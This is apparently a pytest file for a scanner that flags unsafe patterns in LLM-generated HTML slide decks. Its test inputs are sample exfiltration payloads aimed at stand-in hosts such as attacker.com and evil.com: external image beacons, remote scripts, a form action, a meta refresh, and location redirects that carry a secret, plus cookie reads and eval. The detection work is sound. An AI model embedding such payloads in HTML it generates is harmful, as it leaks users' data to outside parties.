"""Tests for LLM-output HTML safety scanning (AISEC-248 PR1)."""

from src.utils.html_safety import scan_html_for_unsafe_patterns


def test_clean_chartjs_html_has_no_findings():
    html = (
        '<div class="slide"><canvas id="c"></canvas></div>'
        '<script>const ctx=document.getElementById("c");new Chart(ctx,{});</script>'
    )
    assert scan_html_for_unsafe_patterns(html) == []


def test_detects_fetch():
    assert "fetch" in " ".join(scan_html_for_unsafe_patterns('<script>fetch("https://x")</script>'))


def test_detects_xhr_and_sendbeacon():
    findings = scan_html_for_unsafe_patterns(
        '<script>new XMLHttpRequest();navigator.sendBeacon("/x")</script>'
    )
    joined = " ".join(findings)
    assert "XMLHttpRequest" in joined and "sendBeacon" in joined


def test_detects_cookie_eval_newfunction():
    findings = " ".join(
        scan_html_for_unsafe_patterns('<script>document.cookie;eval("x");new Function("y")</script>')
    )
    assert "document.cookie" in findings and "eval" in findings and "new Function" in findings


def test_detects_external_img():
    assert scan_html_for_unsafe_patterns('<img src="https://attacker.com/b.png?d=1">')


def test_allows_data_uri_img():
    assert scan_html_for_unsafe_patterns('<img src="data:image/png;base64,AAAA">') == []


def test_detects_external_script_src_outside_allowlist():
    assert scan_html_for_unsafe_patterns('<script src="https://evil.com/x.js"></script>')


def test_allows_cdn_script_src():
    assert scan_html_for_unsafe_patterns(
        '<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>'
        '<script src="https://cdn.tailwindcss.com"></script>'
    ) == []


def test_detects_form_action():
    assert scan_html_for_unsafe_patterns('<form action="https://evil.com"></form>')


# --- navigation / redirect exfil vectors (not blockable by CSP connect/img) ---

def test_detects_window_location_assignment():
    findings = " ".join(
        scan_html_for_unsafe_patterns('<script>window.location = "https://x/?d=" + secret;</script>')
    )
    assert "navigation" in findings


def test_detects_location_href_assign_replace():
    for js in (
        '<script>location.href = "https://x/?d=1";</script>',
        '<script>location.assign("https://x");</script>',
        '<script>document.location.replace("https://x");</script>',
    ):
        assert scan_html_for_unsafe_patterns(js), js


def test_detects_window_open():
    assert scan_html_for_unsafe_patterns('<script>window.open("https://x/?d=1");</script>')


def test_detects_meta_refresh():
    assert scan_html_for_unsafe_patterns(
        '<meta http-equiv="refresh" content="0;url=https://attacker.com/?d=secret">'
    )


def test_clean_deck_with_chart_navigation_words_in_text_not_flagged():
    # "location" appearing as slide prose / chart labels must not trip the scanner.
    html = (
        '<div class="slide"><h1>Sales by location</h1>'
        '<p>Open the report to navigate the data.</p></div>'
    )
    assert scan_html_for_unsafe_patterns(html) == []
